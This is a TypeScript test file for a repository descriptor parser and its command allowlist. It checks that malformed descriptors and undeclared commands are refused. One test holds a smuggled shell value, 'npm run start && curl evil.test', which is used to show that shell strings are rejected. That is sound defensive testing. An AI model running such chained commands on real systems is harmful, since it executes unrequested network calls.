import { describe, expect, it } from 'vitest';
import { DescriptorProblem, findCommand, parseDescriptor } from '../src/main/services/descriptor';

const valid = {
	version: 1,
	product: 'Coke',
	contextDir: '.flkd',
	prototypeRoot: 'src/prototypes',
	branchPattern: { prototype: 'fd/<project-id>/i<n>', codebase: 'feature/<project-id>' },
	commands: [
		{ id: 'preview', label: 'Run prototype', argv: ['npm', 'run', 'start:prototype'], servesPreviewOn: 3100 },
		{ id: 'typecheck', label: 'Typecheck', argv: ['npx', 'tsc', '--noEmit'] },
	],
	designSystem: { package: '@flocksafety/flock-react-component-lib' },
};

const parse = (o: unknown) => parseDescriptor(JSON.stringify(o));

describe('parseDescriptor', () => {
	it('reads a complete descriptor', () => {
		const d = parse(valid);
		expect(d.product).toBe('Coke');
		expect(d.commands).toHaveLength(2);
		expect(d.commands[0]?.servesPreviewOn).toBe(3100);
	});

	it('leaves servesPreviewOn off a command that does not serve one', () => {
		expect(parse(valid).commands[1]?.servesPreviewOn).toBeUndefined();
	});

	it.each([
		['not JSON at all', '{nope'],
		['a JSON array', '[]'],
	])('refuses %s', (_label, text) => {
		expect(() => parseDescriptor(text)).toThrow(DescriptorProblem);
	});

	it('refuses a version it does not understand rather than guessing', () => {
		expect(() => parse({ ...valid, version: 2 })).toThrow(/understands 1/);
	});

	it.each(['product', 'contextDir', 'prototypeRoot'])('refuses a descriptor missing %s', (key) => {
		const broken: Record<string, unknown> = { ...valid };
		delete broken[key];
		expect(() => parse(broken)).toThrow(new RegExp(key));
	});

	it('refuses a missing branch pattern', () => {
		expect(() => parse({ ...valid, branchPattern: { prototype: 'x' } })).toThrow(/branchPattern/);
	});

	it('refuses a missing designSystem.package', () => {
		expect(() => parse({ ...valid, designSystem: {} })).toThrow(/designSystem\.package/);
	});

	it('refuses a command given as a shell string, not an argv array', () => {
		// The whole point of argv is that no shell parses it. A string here would
		// mean quoting, pipes and substitution are suddenly in scope.
		const commands = [{ id: 'preview', label: 'Run', argv: 'npm run start && curl evil.test' }];
		expect(() => parse({ ...valid, commands })).toThrow(/argv must be a non-empty array/);
	});

	it('refuses an empty argv', () => {
		expect(() => parse({ ...valid, commands: [{ id: 'a', label: 'A', argv: [] }] })).toThrow(/non-empty/);
	});

	it('refuses two commands sharing an id, which would make the allowlist ambiguous', () => {
		const commands = [
			{ id: 'preview', label: 'One', argv: ['a'] },
			{ id: 'preview', label: 'Two', argv: ['b'] },
		];
		expect(() => parse({ ...valid, commands })).toThrow(/two commands with id/);
	});
});

describe('findCommand', () => {
	it('returns a declared command', () => {
		expect(findCommand(parse(valid), 'typecheck').argv).toEqual(['npx', 'tsc', '--noEmit']);
	});

	it('refuses anything not declared, which is how the allowlist is enforced', () => {
		expect(() => findCommand(parse(valid), 'rm')).toThrow(/not a command this repository declares/);
	});
});
